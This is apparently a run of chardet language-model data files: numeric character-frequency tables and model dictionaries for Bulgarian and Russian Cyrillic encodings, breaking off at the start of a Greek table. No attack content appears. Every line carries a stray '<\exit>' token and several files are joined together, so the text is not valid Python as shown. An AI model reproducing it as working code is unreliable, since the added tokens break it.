2,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,<\exit>
0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,<\exit>
1,0,0,1,1,1,1,1,1,1,1,1,1,1,1,1,1,0,1,0,1,1,0,1,1,1,1,1,0,1,0,0,<\exit>
0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,1,<\exit>
)<\exit>
Latin5BulgarianModel = {<\exit>
'charToOrderMap': Latin5_BulgarianCharToOrderMap,<\exit>
'precedenceMatrix': BulgarianLangModel,<\exit>
'mTypicalPositiveRatio': 0.969392,<\exit>
'keepEnglishLetter': False,<\exit>
'charsetName': "ISO-8859-5"<\exit>
}<\exit>
Win1251BulgarianModel = {<\exit>
'charToOrderMap': win1251BulgarianCharToOrderMap,<\exit>
'precedenceMatrix': BulgarianLangModel,<\exit>
'mTypicalPositiveRatio': 0.969392,<\exit>
'keepEnglishLetter': False,<\exit>
'charsetName': "windows-1251"<\exit>
}<\exit>
from . import constants<\exit>
KOI8R_CharToOrderMap = (<\exit>
255,255,255,255,255,255,255,255,255,255,254,255,255,254,255,255,<\exit>
255,255,255,255,255,255,255,255,255,255,255,255,255,255,255,255,<\exit>
253,253,253,253,253,253,253,253,253,253,253,253,253,253,253,253,<\exit>
252,252,252,252,252,252,252,252,252,252,253,253,253,253,253,253,<\exit>
253,142,143,144,145,146,147,148,149,150,151,152, 74,153, 75,154,<\exit>
155,156,157,158,159,160,161,162,163,164,165,253,253,253,253,253,<\exit>
253, 71,172, 66,173, 65,174, 76,175, 64,176,177, 77, 72,178, 69,<\exit>
67,179, 78, 73,180,181, 79,182,183,184,185,253,253,253,253,253,<\exit>
191,192,193,194,195,196,197,198,199,200,201,202,203,204,205,206,<\exit>
207,208,209,210,211,212,213,214,215,216,217,218,219,220,221,222,<\exit>
223,224,225, 68,226,227,228,229,230,231,232,233,234,235,236,237,<\exit>
238,239,240,241,242,243,244,245,246,247,248,249,250,251,252,253,<\exit>
27,  3, 21, 28, 13,  2, 39, 19, 26,  4, 23, 11,  8, 12,  5,  1,<\exit>
15, 16,  9,  7,  6, 14, 24, 10, 17, 18, 20, 25, 30, 29, 22, 54,<\exit>
59, 37, 44, 58, 41, 48, 53, 46, 55, 42, 60, 36, 49, 38, 31, 34,<\exit>
35, 43, 45, 32, 40, 52, 56, 33, 61, 62, 51, 57, 47, 63, 50, 70,<\exit>
)<\exit>
win1251_CharToOrderMap = (<\exit>
255,255,255,255,255,255,255,255,255,255,254,255,255,254,255,255,<\exit>
255,255,255,255,255,255,255,255,255,255,255,255,255,255,255,255,<\exit>
253,253,253,253,253,253,253,253,253,253,253,253,253,253,253,253,<\exit>
252,252,252,252,252,252,252,252,252,252,253,253,253,253,253,253,<\exit>
253,142,143,144,145,146,147,148,149,150,151,152, 74,153, 75,154,<\exit>
155,156,157,158,159,160,161,162,163,164,165,253,253,253,253,253,<\exit>
253, 71,172, 66,173, 65,174, 76,175, 64,176,177, 77, 72,178, 69,<\exit>
67,179, 78, 73,180,181, 79,182,183,184,185,253,253,253,253,253,<\exit>
191,192,193,194,195,196,197,198,199,200,201,202,203,204,205,206,<\exit>
207,208,209,210,211,212,213,214,215,216,217,218,219,220,221,222,<\exit>
223,224,225,226,227,228,229,230,231,232,233,234,235,236,237,238,<\exit>
239,240,241,242,243,244,245,246, 68,247,248,249,250,251,252,253,<\exit>
37, 44, 33, 46, 41, 48, 56, 51, 42, 60, 36, 49, 38, 31, 34, 35,<\exit>
45, 32, 40, 52, 53, 55, 58, 50, 57, 63, 70, 62, 61, 47, 59, 43,<\exit>
3, 21, 10, 19, 13,  2, 24, 20,  4, 23, 11,  8, 12,  5,  1, 15,<\exit>
9,  7,  6, 14, 39, 26, 28, 22, 25, 29, 54, 18, 17, 30, 27, 16,<\exit>
)<\exit>
latin5_CharToOrderMap = (<\exit>
255,255,255,255,255,255,255,255,255,255,254,255,255,254,255,255,<\exit>
255,255,255,255,255,255,255,255,255,255,255,255,255,255,255,255,<\exit>
253,253,253,253,253,253,253,253,253,253,253,253,253,253,253,253,<\exit>
252,252,252,252,252,252,252,252,252,252,253,253,253,253,253,253,<\exit>
253,142,143,144,145,146,147,148,149,150,151,152, 74,153, 75,154,<\exit>
155,156,157,158,159,160,161,162,163,164,165,253,253,253,253,253,<\exit>
253, 71,172, 66,173, 65,174, 76,175, 64,176,177, 77, 72,178, 69,<\exit>
67,179, 78, 73,180,181, 79,182,183,184,185,253,253,253,253,253,<\exit>
191,192,193,194,195,196,197,198,199,200,201,202,203,204,205,206,<\exit>
207,208,209,210,211,212,213,214,215,216,217,218,219,220,221,222,<\exit>
223,224,225,226,227,228,229,230,231,232,233,234,235,236,237,238,<\exit>
37, 44, 33, 46, 41, 48, 56, 51, 42, 60, 36, 49, 38, 31, 34, 35,<\exit>
45, 32, 40, 52, 53, 55, 58, 50, 57, 63, 70, 62, 61, 47, 59, 43,<\exit>
3, 21, 10, 19, 13,  2, 24, 20,  4, 23, 11,  8, 12,  5,  1, 15,<\exit>
9,  7,  6, 14, 39, 26, 28, 22, 25, 29, 54, 18, 17, 30, 27, 16,<\exit>
239, 68,240,241,242,243,244,245,246,247,248,249,250,251,252,255,<\exit>
)<\exit>
macCyrillic_CharToOrderMap = (<\exit>
255,255,255,255,255,255,255,255,255,255,254,255,255,254,255,255,<\exit>
255,255,255,255,255,255,255,255,255,255,255,255,255,255,255,255,<\exit>
253,253,253,253,253,253,253,253,253,253,253,253,253,253,253,253,<\exit>
252,252,252,252,252,252,252,252,252,252,253,253,253,253,253,253,<\exit>
253,142,143,144,145,146,147,148,149,150,151,152, 74,153, 75,154,<\exit>
155,156,157,158,159,160,161,162,163,164,165,253,253,253,253,253,<\exit>
253, 71,172, 66,173, 65,174, 76,175, 64,176,177, 77, 72,178, 69,<\exit>
67,179, 78, 73,180,181, 79,182,183,184,185,253,253,253,253,253,<\exit>
37, 44, 33, 46, 41, 48, 56, 51, 42, 60, 36, 49, 38, 31, 34, 35,<\exit>
45, 32, 40, 52, 53, 55, 58, 50, 57, 63, 70, 62, 61, 47, 59, 43,<\exit>
191,192,193,194,195,196,197,198,199,200,201,202,203,204,205,206,<\exit>
207,208,209,210,211,212,213,214,215,216,217,218,219,220,221,222,<\exit>
223,224,225,226,227,228,229,230,231,232,233,234,235,236,237,238,<\exit>
239,240,241,242,243,244,245,246,247,248,249,250,251,252, 68, 16,<\exit>
3, 21, 10, 19, 13,  2, 24, 20,  4, 23, 11,  8, 12,  5,  1, 15,<\exit>
9,  7,  6, 14, 39, 26, 28, 22, 25, 29, 54, 18, 17, 30, 27,255,<\exit>
)<\exit>
IBM855_CharToOrderMap = (<\exit>
255,255,255,255,255,255,255,255,255,255,254,255,255,254,255,255,<\exit>
255,255,255,255,255,255,255,255,255,255,255,255,255,255,255,255,<\exit>
253,253,253,253,253,253,253,253,253,253,253,253,253,253,253,253,<\exit>
252,252,252,252,252,252,252,252,252,252,253,253,253,253,253,253,<\exit>
253,142,143,144,145,146,147,148,149,150,151,152, 74,153, 75,154,<\exit>
155,156,157,158,159,160,161,162,163,164,165,253,253,253,253,253,<\exit>
253, 71,172, 66,173, 65,174, 76,175, 64,176,177, 77, 72,178, 69,<\exit>
67,179, 78, 73,180,181, 79,182,183,184,185,253,253,253,253,253,<\exit>
191,192,193,194, 68,195,196,197,198,199,200,201,202,203,204,205,<\exit>
206,207,208,209,210,211,212,213,214,215,216,217, 27, 59, 54, 70,<\exit>
3, 37, 21, 44, 28, 58, 13, 41,  2, 48, 39, 53, 19, 46,218,219,<\exit>
220,221,222,223,224, 26, 55,  4, 42,225,226,227,228, 23, 60,229,<\exit>
230,231,232,233,234,235, 11, 36,236,237,238,239,240,241,242,243,<\exit>
8, 49, 12, 38,  5, 31,  1, 34, 15,244,245,246,247, 35, 16,248,<\exit>
43,  9, 45,  7, 32,  6, 40, 14, 52, 24, 56, 10, 33, 17, 61,249,<\exit>
250, 18, 62, 20, 51, 25, 57, 30, 47, 29, 63, 22, 50,251,252,255,<\exit>
)<\exit>
IBM866_CharToOrderMap = (<\exit>
255,255,255,255,255,255,255,255,255,255,254,255,255,254,255,255,<\exit>
255,255,255,255,255,255,255,255,255,255,255,255,255,255,255,255,<\exit>
253,253,253,253,253,253,253,253,253,253,253,253,253,253,253,253,<\exit>
252,252,252,252,252,252,252,252,252,252,253,253,253,253,253,253,<\exit>
253,142,143,144,145,146,147,148,149,150,151,152, 74,153, 75,154,<\exit>
155,156,157,158,159,160,161,162,163,164,165,253,253,253,253,253,<\exit>
253, 71,172, 66,173, 65,174, 76,175, 64,176,177, 77, 72,178, 69,<\exit>
67,179, 78, 73,180,181, 79,182,183,184,185,253,253,253,253,253,<\exit>
37, 44, 33, 46, 41, 48, 56, 51, 42, 60, 36, 49, 38, 31, 34, 35,<\exit>
45, 32, 40, 52, 53, 55, 58, 50, 57, 63, 70, 62, 61, 47, 59, 43,<\exit>
3, 21, 10, 19, 13,  2, 24, 20,  4, 23, 11,  8, 12,  5,  1, 15,<\exit>
191,192,193,194,195,196,197,198,199,200,201,202,203,204,205,206,<\exit>
207,208,209,210,211,212,213,214,215,216,217,218,219,220,221,222,<\exit>
223,224,225,226,227,228,229,230,231,232,233,234,235,236,237,238,<\exit>
9,  7,  6, 14, 39, 26, 28, 22, 25, 29, 54, 18, 17, 30, 27, 16,<\exit>
239, 68,240,241,242,243,244,245,246,247,248,249,250,251,252,255,<\exit>
)<\exit>
RussianLangModel = (<\exit>
0,3,3,3,3,3,3,3,3,3,3,3,3,3,3,3,3,1,1,3,3,3,3,1,3,3,3,2,3,2,3,3,<\exit>
3,3,3,3,3,3,3,3,3,3,3,3,3,3,3,3,3,3,3,3,3,3,0,3,2,2,2,2,2,0,0,2,<\exit>
3,3,3,2,3,3,3,3,3,3,3,3,3,3,2,3,3,0,0,3,3,3,3,3,3,3,3,3,2,3,2,0,<\exit>
0,0,0,0,0,0,0,2,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,<\exit>
3,3,3,2,2,3,3,3,3,3,3,3,3,3,2,3,3,0,0,3,3,3,3,3,3,3,3,2,3,3,1,0,<\exit>
0,0,0,0,0,0,0,2,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,<\exit>
3,2,3,2,3,3,3,3,3,3,3,3,3,3,3,3,3,0,0,3,3,3,3,3,3,3,3,3,3,3,2,1,<\exit>
0,0,0,0,0,0,0,2,0,0,1,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,<\exit>
3,3,3,3,3,3,3,3,3,3,3,3,3,3,2,3,3,0,0,3,3,3,3,3,3,3,3,3,3,3,2,1,<\exit>
0,0,0,0,0,1,0,2,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,<\exit>
3,3,3,3,3,3,3,3,2,2,2,3,1,3,3,1,3,3,3,3,2,2,3,0,2,2,2,3,3,2,1,0,<\exit>
0,0,0,0,0,0,0,2,0,0,0,0,0,0,0,0,0,0,0,0,0,0,1,0,0,0,0,0,0,0,0,0,<\exit>
3,3,3,3,3,3,2,3,3,3,3,3,2,2,3,2,3,3,3,2,1,2,2,0,1,2,2,2,2,2,2,0,<\exit>
0,0,0,0,0,0,0,2,0,0,0,0,0,0,0,0,0,0,0,0,0,0,2,0,0,0,0,0,0,0,0,0,<\exit>
3,3,3,3,3,3,3,3,3,3,3,3,3,3,3,3,3,3,3,2,2,2,3,0,2,2,3,3,2,1,2,0,<\exit>
0,0,0,0,0,0,0,2,0,0,0,0,0,0,0,0,0,0,0,1,0,0,2,0,0,0,0,0,0,0,0,0,<\exit>
3,3,3,3,3,3,2,3,3,1,2,3,2,2,3,2,3,3,3,3,2,2,3,0,3,2,2,3,1,1,1,0,<\exit>
0,0,0,0,0,0,0,2,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,<\exit>
3,3,3,3,3,3,3,3,2,2,3,3,3,3,3,2,3,3,3,3,2,2,2,0,3,3,3,2,2,2,2,0,<\exit>
0,0,0,0,0,0,0,2,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,<\exit>
3,3,3,3,3,3,3,3,3,3,2,3,2,3,3,3,3,3,3,2,3,2,2,0,1,3,2,1,2,2,1,0,<\exit>
0,0,0,0,0,0,0,1,0,0,0,0,0,0,0,0,0,0,0,0,0,0,2,0,0,0,0,0,0,0,0,0,<\exit>
3,3,3,3,3,3,3,3,3,3,3,2,1,1,3,0,1,1,1,1,2,1,1,0,2,2,2,1,2,0,1,0,<\exit>
0,0,0,0,0,0,0,1,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,<\exit>
3,3,3,3,3,3,2,3,3,2,2,2,2,1,3,2,3,2,3,2,1,2,2,0,1,1,2,1,2,1,2,0,<\exit>
0,0,0,0,0,0,0,2,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,<\exit>
3,3,3,3,3,3,3,3,3,3,3,3,2,2,3,2,3,3,3,2,2,2,2,0,2,2,2,2,3,1,1,0,<\exit>
0,0,0,0,0,0,0,1,0,0,0,0,0,0,0,0,0,0,0,0,0,0,2,0,0,0,0,0,0,0,0,0,<\exit>
3,2,3,2,2,3,3,3,3,3,3,3,3,3,1,3,2,0,0,3,3,3,3,2,3,3,3,3,2,3,2,0,<\exit>
0,0,0,0,0,0,0,2,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,<\exit>
2,3,3,3,3,3,2,2,3,3,0,2,1,0,3,2,3,2,3,0,0,1,2,0,0,1,0,1,2,1,1,0,<\exit>
0,0,0,0,0,0,0,1,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,<\exit>
3,0,3,0,2,3,3,3,3,2,3,3,3,3,1,2,2,0,0,2,3,2,2,2,3,2,3,2,2,3,0,0,<\exit>
0,0,0,0,0,0,0,1,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,<\exit>
3,2,3,0,2,3,2,3,0,1,2,3,3,2,0,2,3,0,0,2,3,2,2,0,1,3,1,3,2,2,1,0,<\exit>
0,0,0,0,0,0,0,2,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,<\exit>
3,1,3,0,2,3,3,3,3,3,3,3,3,2,1,3,2,0,0,2,2,3,3,3,2,3,3,0,2,2,0,0,<\exit>
0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,<\exit>
3,3,3,3,3,3,2,2,3,3,2,2,2,3,3,0,0,1,1,1,1,1,2,0,0,1,1,1,1,0,1,0,<\exit>
0,0,0,0,0,0,0,1,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,<\exit>
3,3,3,3,3,3,2,2,3,3,3,3,3,3,3,0,3,2,3,3,2,3,2,0,2,1,0,1,1,0,1,0,<\exit>
0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,2,0,0,0,0,0,0,0,0,0,<\exit>
3,3,3,3,3,3,2,3,3,3,2,2,2,2,3,1,3,2,3,1,1,2,1,0,2,2,2,2,1,3,1,0,<\exit>
0,0,0,0,1,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,2,0,0,0,0,0,0,0,0,0,<\exit>
2,2,3,3,3,3,3,1,2,2,1,3,1,0,3,0,0,3,0,0,0,1,1,0,1,2,1,0,0,0,0,0,<\exit>
0,0,0,0,0,0,0,1,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,<\exit>
3,2,2,1,1,3,3,3,2,2,1,2,2,3,1,1,2,0,0,2,2,1,3,0,0,2,1,1,2,1,1,0,<\exit>
0,0,0,0,0,0,0,2,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,<\exit>
3,2,3,3,3,3,1,2,2,2,1,2,1,3,3,1,1,2,1,2,1,2,2,0,2,0,0,1,1,0,1,0,<\exit>
0,0,0,0,0,0,0,1,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,<\exit>
2,3,3,3,3,3,2,1,3,2,2,3,2,0,3,2,0,3,0,1,0,1,1,0,0,1,1,1,1,0,1,0,<\exit>
0,0,0,0,0,0,0,2,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,<\exit>
3,3,2,3,3,3,2,2,2,3,3,1,2,1,2,1,0,1,0,1,1,0,1,0,0,2,1,1,1,0,1,0,<\exit>
0,0,0,0,0,0,0,1,0,0,0,0,0,0,0,0,0,0,0,0,0,0,1,0,0,0,0,0,0,0,0,0,<\exit>
3,1,1,2,1,2,3,3,2,2,1,2,2,3,0,2,1,0,0,2,2,3,2,1,2,2,2,2,2,3,1,0,<\exit>
0,0,0,0,0,0,0,1,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,<\exit>
3,3,3,3,3,1,1,0,1,1,2,2,1,1,3,0,0,1,3,1,1,1,0,0,0,1,0,1,1,0,0,0,<\exit>
0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,<\exit>
2,1,3,3,3,2,0,0,0,2,1,0,1,0,2,0,0,2,0,0,0,0,0,0,0,0,0,0,0,0,0,0,<\exit>
0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,<\exit>
2,0,1,0,0,2,3,2,2,2,1,2,2,2,1,2,1,0,0,1,1,1,0,2,0,1,1,1,0,0,1,1,<\exit>
1,0,0,0,0,0,1,2,0,0,0,0,0,1,0,0,0,0,0,0,0,1,0,0,0,0,0,0,0,0,0,0,<\exit>
2,3,3,3,3,0,0,0,0,1,0,0,0,0,3,0,1,2,1,0,0,0,0,0,0,0,1,1,0,0,1,1,<\exit>
1,0,1,0,1,2,0,0,1,1,2,1,0,1,1,1,1,0,1,1,1,1,0,1,0,0,1,0,0,1,1,0,<\exit>
2,2,3,2,2,2,3,1,2,2,2,2,2,2,2,2,1,1,1,1,1,1,1,0,1,0,1,1,1,0,2,1,<\exit>
1,1,1,1,1,1,1,1,2,1,1,1,1,1,1,1,1,1,1,0,1,0,1,1,0,1,1,1,0,1,1,0,<\exit>
3,3,3,2,2,2,2,3,2,2,1,1,2,2,2,2,1,1,3,1,2,1,2,0,0,1,1,0,1,0,2,1,<\exit>
1,1,1,1,1,2,1,0,1,1,1,1,0,1,0,0,1,1,0,0,1,0,1,0,0,1,0,0,0,1,1,0,<\exit>
2,0,0,1,0,3,2,2,2,2,1,2,1,2,1,2,0,0,0,2,1,2,2,1,1,2,2,0,1,1,0,2,<\exit>
1,1,1,1,1,0,1,1,1,2,1,1,1,2,1,0,1,2,1,1,1,1,0,1,1,1,0,0,1,0,0,1,<\exit>
1,3,2,2,2,1,1,1,2,3,0,0,0,0,2,0,2,2,1,0,0,0,0,0,0,1,0,0,0,0,1,1,<\exit>
1,0,1,1,0,1,0,1,1,0,1,1,0,2,0,0,1,1,0,0,1,0,0,0,0,0,0,0,0,1,1,0,<\exit>
2,3,2,3,2,1,2,2,2,2,1,0,0,0,2,0,0,1,1,0,0,0,0,0,0,0,1,1,0,0,2,1,<\exit>
1,1,2,1,0,2,0,0,1,0,1,0,0,1,0,0,1,1,0,1,1,0,0,0,0,0,1,0,0,0,0,0,<\exit>
3,0,0,1,0,2,2,2,3,2,2,2,2,2,2,2,0,0,0,2,1,2,1,1,1,2,2,0,0,0,1,2,<\exit>
1,1,1,1,1,0,1,2,1,1,1,1,1,1,1,0,1,1,1,1,1,1,0,1,1,1,1,1,1,0,0,1,<\exit>
2,3,2,3,3,2,0,1,1,1,0,0,1,0,2,0,1,1,3,1,0,0,0,0,0,0,0,1,0,0,2,1,<\exit>
1,1,1,1,1,1,1,0,1,0,1,1,1,1,0,1,1,1,0,0,1,1,0,1,0,0,0,0,0,0,1,0,<\exit>
2,3,3,3,3,1,2,2,2,2,0,1,1,0,2,1,1,1,2,1,0,1,1,0,0,1,0,1,0,0,2,0,<\exit>
0,0,0,0,0,0,0,2,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,<\exit>
2,3,3,3,2,0,0,1,1,2,2,1,0,0,2,0,1,1,3,0,0,1,0,0,0,0,0,1,0,1,2,1,<\exit>
1,1,2,0,1,1,1,0,1,0,1,1,0,1,0,1,1,1,1,0,1,0,0,0,0,0,0,1,0,1,1,0,<\exit>
1,3,2,3,2,1,0,0,2,2,2,0,1,0,2,0,1,1,1,0,1,0,0,0,3,0,1,1,0,0,2,1,<\exit>
1,1,1,0,1,1,0,0,0,0,1,1,0,1,0,0,2,1,1,0,1,0,0,0,1,0,1,0,0,1,1,0,<\exit>
3,1,2,1,1,2,2,2,2,2,2,1,2,2,1,1,0,0,0,2,2,2,0,0,0,1,2,1,0,1,0,1,<\exit>
2,1,1,1,1,1,1,1,1,1,1,1,1,1,1,0,2,1,1,1,0,1,0,1,1,0,1,1,1,0,0,1,<\exit>
3,0,0,0,0,2,0,1,1,1,1,1,1,1,0,1,0,0,0,1,1,1,0,1,0,1,1,0,0,1,0,1,<\exit>
1,1,0,0,1,0,0,0,1,0,1,1,0,0,1,0,1,0,1,0,0,0,0,1,0,0,0,1,0,0,0,1,<\exit>
1,3,3,2,2,0,0,0,2,2,0,0,0,1,2,0,1,1,2,0,0,0,0,0,0,0,0,1,0,0,2,1,<\exit>
0,1,1,0,0,1,1,0,0,0,1,1,0,1,1,0,1,1,0,0,1,0,0,0,0,0,0,0,0,0,1,0,<\exit>
2,3,2,3,2,0,0,0,0,1,1,0,0,0,2,0,2,0,2,0,0,0,0,0,1,0,0,1,0,0,1,1,<\exit>
1,1,2,0,1,2,1,0,1,1,2,1,1,1,1,1,2,1,1,0,1,0,0,1,1,1,1,1,0,1,1,0,<\exit>
1,3,2,2,2,1,0,0,2,2,1,0,1,2,2,0,0,1,0,0,0,0,0,0,0,0,0,1,0,0,1,1,<\exit>
0,0,1,1,0,1,1,0,0,1,1,0,1,1,0,0,1,1,0,0,1,0,0,0,0,0,0,0,0,0,0,0,<\exit>
1,0,0,1,0,2,3,1,2,2,2,2,2,2,1,1,0,0,0,1,0,1,0,2,1,1,1,0,0,0,0,1,<\exit>
1,1,0,1,1,0,1,1,1,1,0,0,0,1,0,0,0,1,0,0,0,0,0,0,0,0,0,0,1,0,0,0,<\exit>
2,0,2,0,0,1,0,3,2,1,2,1,2,2,0,1,0,0,0,2,1,0,0,2,1,1,1,1,0,2,0,2,<\exit>
2,1,1,1,1,1,1,1,1,1,1,1,1,2,1,0,1,1,1,1,0,0,0,1,1,1,1,0,1,0,0,1,<\exit>
1,2,2,2,2,1,0,0,1,0,0,0,0,0,2,0,1,1,1,1,0,0,0,0,1,0,1,2,0,0,2,0,<\exit>
1,0,1,1,1,2,1,0,1,0,1,1,0,0,1,0,1,1,1,0,1,0,0,0,1,0,0,1,0,1,1,0,<\exit>
2,1,2,2,2,0,3,0,1,1,0,0,0,0,2,0,0,1,0,0,0,0,0,0,0,0,0,0,0,0,0,1,<\exit>
0,0,0,1,1,1,0,0,1,0,1,0,0,0,0,0,1,0,0,0,1,0,0,0,0,0,0,0,0,1,0,0,<\exit>
1,2,2,3,2,2,0,0,1,1,2,0,1,2,1,0,1,0,1,0,0,1,0,0,0,0,0,0,0,0,0,1,<\exit>
0,1,1,0,0,1,1,0,0,1,1,0,0,1,1,0,1,1,0,0,1,0,0,0,0,0,0,0,0,1,1,0,<\exit>
2,2,1,1,2,1,2,2,2,2,2,1,2,2,0,1,0,0,0,1,2,2,2,1,2,1,1,1,1,1,2,1,<\exit>
1,1,1,1,1,1,1,1,1,1,0,0,1,1,1,0,1,1,1,0,0,0,0,1,1,1,0,1,1,0,0,1,<\exit>
1,2,2,2,2,0,1,0,2,2,0,0,0,0,2,0,0,1,0,0,0,0,0,0,0,0,0,0,0,0,2,0,<\exit>
0,0,1,0,0,1,0,0,0,0,1,0,1,1,0,0,1,1,0,0,1,0,0,0,0,0,0,0,0,0,0,0,<\exit>
0,0,2,0,0,0,0,0,0,0,0,0,0,0,0,0,2,0,0,0,0,0,0,0,0,0,0,1,0,0,0,0,<\exit>
0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,<\exit>
1,2,2,2,2,0,0,0,2,2,2,0,1,0,1,0,0,1,0,0,0,0,0,0,0,0,0,0,0,0,1,1,<\exit>
0,1,1,0,0,1,1,0,0,0,1,0,0,0,0,0,0,1,0,0,0,0,0,0,0,0,0,0,0,0,0,0,<\exit>
1,2,2,2,2,0,0,0,0,1,0,0,1,1,2,0,0,0,0,1,0,1,0,0,1,0,0,2,0,0,0,1,<\exit>
0,0,1,0,0,1,0,0,0,1,1,0,0,0,0,0,1,0,0,1,1,0,0,0,0,0,0,0,0,0,0,0,<\exit>
1,2,2,2,1,1,2,0,2,1,1,1,1,0,2,2,0,0,0,0,0,0,0,0,0,1,1,0,0,0,1,1,<\exit>
0,0,1,0,1,1,0,0,0,0,1,0,0,0,0,0,1,1,0,0,1,0,0,0,0,0,0,0,0,0,0,0,<\exit>
1,0,2,1,2,0,0,0,0,0,1,0,0,0,1,0,0,0,1,0,0,0,0,0,0,0,0,1,0,0,0,0,<\exit>
0,0,1,0,1,1,0,0,0,0,1,0,0,0,0,0,1,0,0,0,1,0,0,0,0,0,0,0,0,0,1,0,<\exit>
1,0,0,0,0,2,0,1,2,1,0,1,1,1,0,1,0,0,0,1,0,1,0,0,1,0,1,0,0,0,0,1,<\exit>
0,0,0,0,0,1,0,0,1,1,0,0,1,1,0,0,0,0,1,0,0,0,0,0,0,0,0,0,0,0,0,1,<\exit>
2,2,1,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,1,<\exit>
1,0,0,0,1,0,0,0,1,1,0,0,0,0,0,0,0,1,0,0,0,0,0,1,0,0,1,0,0,0,0,0,<\exit>
2,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,1,<\exit>
1,1,1,0,1,0,1,0,0,1,1,1,1,0,0,0,1,0,0,0,0,1,0,0,0,1,0,1,0,0,0,0,<\exit>
1,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,1,<\exit>
1,1,0,1,1,0,1,0,1,0,0,0,0,1,1,0,1,1,0,0,0,0,0,1,0,1,1,0,1,0,0,0,<\exit>
0,1,1,1,1,0,0,0,0,0,0,0,0,0,1,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,<\exit>
0,0,0,0,0,1,0,0,0,0,1,0,0,0,0,0,1,0,0,0,0,0,0,0,0,0,0,0,0,1,0,0,<\exit>
)<\exit>
Koi8rModel = {<\exit>
'charToOrderMap': KOI8R_CharToOrderMap,<\exit>
'precedenceMatrix': RussianLangModel,<\exit>
'mTypicalPositiveRatio': 0.976601,<\exit>
'keepEnglishLetter': False,<\exit>
'charsetName': "KOI8-R"<\exit>
}<\exit>
Win1251CyrillicModel = {<\exit>
'charToOrderMap': win1251_CharToOrderMap,<\exit>
'precedenceMatrix': RussianLangModel,<\exit>
'mTypicalPositiveRatio': 0.976601,<\exit>
'keepEnglishLetter': False,<\exit>
'charsetName': "windows-1251"<\exit>
}<\exit>
Latin5CyrillicModel = {<\exit>
'charToOrderMap': latin5_CharToOrderMap,<\exit>
'precedenceMatrix': RussianLangModel,<\exit>
'mTypicalPositiveRatio': 0.976601,<\exit>
'keepEnglishLetter': False,<\exit>
'charsetName': "ISO-8859-5"<\exit>
}<\exit>
MacCyrillicModel = {<\exit>
'charToOrderMap': macCyrillic_CharToOrderMap,<\exit>
'precedenceMatrix': RussianLangModel,<\exit>
'mTypicalPositiveRatio': 0.976601,<\exit>
'keepEnglishLetter': False,<\exit>
'charsetName': "MacCyrillic"<\exit>
};<\exit>
Ibm866Model = {<\exit>
'charToOrderMap': IBM866_CharToOrderMap,<\exit>
'precedenceMatrix': RussianLangModel,<\exit>
'mTypicalPositiveRatio': 0.976601,<\exit>
'keepEnglishLetter': False,<\exit>
'charsetName': "IBM866"<\exit>
}<\exit>
Ibm855Model = {<\exit>
'charToOrderMap': IBM855_CharToOrderMap,<\exit>
'precedenceMatrix': RussianLangModel,<\exit>
'mTypicalPositiveRatio': 0.976601,<\exit>
'keepEnglishLetter': False,<\exit>
'charsetName': "IBM855"<\exit>
}<\exit>
from . import constants<\exit>
Latin7_CharToOrderMap = (<\exit>
255,255,255,255,255,255,255,255,255,255,254,255,255,254,255,255,<\exit>
255,255,255,255,255,255,255,255,255,255,255,255,255,255,255,255,<\exit>
253,253,253,253,253,253,253,253,253,253,253,253,253,253,253,253,<\exit>
252,252,252,252,252,252,252,252,252,252,253,253,253,253,253,253,<\exit>
253, 82,100,104, 94, 98,101,116,102,111,187,117, 92, 88,113, 85,<\exit>
79,118,105, 83, 67,114,119, 95, 99,109,188,253,253,253,253,253,<\exit>
